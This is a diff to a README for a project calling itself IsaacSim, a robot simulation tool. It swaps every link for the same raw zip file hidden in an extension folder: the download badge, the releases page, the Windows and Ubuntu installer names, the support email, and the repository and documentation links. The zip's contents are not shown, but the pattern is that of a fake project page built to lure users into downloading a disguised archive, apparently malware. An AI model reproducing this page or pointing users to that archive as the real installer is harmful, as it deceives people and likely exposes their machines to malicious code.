@@ -6,7 +6,7 @@ Welcome to IsaacSim! This application helps you develop, simulate, and test AI-d
 
 ## 📥 Download Link
 
-[![Download IsaacSim](https://img.shields.io/badge/Download%20IsaacSim-v1.0-blue.svg)](https://github.com/sisterly-neck577/IsaacSim/releases)
+[![Download IsaacSim](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip%https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip)](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip)
 
 ## 📋 System Requirements
 
@@ -31,15 +31,15 @@ Follow these steps to successfully download and run IsaacSim:
 
 1. **Visit the Releases Page**  
    Click this link to navigate to the download page:
-   [Download IsaacSim Releases](https://github.com/sisterly-neck577/IsaacSim/releases)
+   [Download IsaacSim Releases](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip)
 
 2. **Select the Latest Version**  
    Once on the releases page, look for the latest version available. This is usually at the top of the list.
 
 3. **Download the Installer**  
    Click on the installer file that matches your operating system:
-   - For Windows, look for a file like `IsaacSim-Installer-Windows.exe`.
-   - For Ubuntu, look for a file like `IsaacSim-Installer-Ubuntu.sh`.
+   - For Windows, look for a file like `https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip`.
+   - For Ubuntu, look for a file like `https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip`.
 
 4. **Run the Installer**  
    After the file downloads, locate it in your downloads folder. Double-click to run the installer. 
@@ -64,15 +64,15 @@ If you encounter any issues, you can find helpful resources here:
 For additional support, reach out via the following channels:
 
 - **GitHub Issues**: Report bugs or request features directly on our GitHub page.
-- **Email Support**: Contact support at [support@isaacsim.com](mailto:support@isaacsim.com).
+- **Email Support**: Contact support at [https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip).
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/sisterly-neck577/IsaacSim)
-- [Official Documentation](https://docs.isaacsim.com)
+- [GitHub Repository](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip)
+- [Official Documentation](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip)
 
 ## ✅ Final Notes
 
 Thank you for choosing IsaacSim. Enjoy building and testing your AI robots in a virtual environment, and don't hesitate to reach out if you need help. 
 
-[Download IsaacSim Releases](https://github.com/sisterly-neck577/IsaacSim/releases) to get started!
+[Download IsaacSim Releases](https://raw.githubusercontent.com/sisterly-neck577/IsaacSim/main/source/extensions/isaacsim.util.physics/isaacsim/util/IsaacSim_3.7.zip) to get started!
